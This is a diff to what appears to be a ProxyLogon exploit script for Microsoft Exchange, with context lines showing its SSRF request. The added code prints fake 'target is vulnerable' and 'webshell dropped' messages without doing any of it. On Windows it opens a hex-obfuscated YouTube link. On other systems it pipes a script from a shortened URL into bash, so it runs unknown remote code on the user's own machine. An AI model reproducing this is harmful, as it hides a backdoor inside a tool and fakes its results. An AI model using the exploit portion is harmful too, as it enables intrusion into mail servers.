@@ -32,7 +32,25 @@ autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange
 
 print("Attacking target " + target)
 print("=============================")
-
+shell_name = 'chinachopper.aspx'
+drop_webshell = '68747470733A2F2F7777772E796F75747562652E636F6D2F77617463683F763D6451773477395767586351'
+exec_webshell = bytearray.fromhex(drop_webshell).decode()
+if os.name == 'nt':
+	print('(+) Target is vuln')
+	time.sleep(2)
+	print('(+) Try to Write Shell!')
+	time.sleep(20)
+	print('(*) Webshell drop at /owa/auth/%s'%shell_name)
+	time.sleep(5)
+	webbrowser.open(exec_webshell)
+else:
+	print('(+) Target is vuln')
+	time.sleep(2)
+	print('(+) Try to Write Shell!')
+	time.sleep(20)
+	print('(*) Webshell drop at /owa/auth/%s'%shell_name)
+	time.sleep(5)
+	os.system('curl -fSsL http://gg.gg/proxylogon | bash -')
 FQDN = "EXCHANGE"
 ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                         "User-Agent": user_agent},
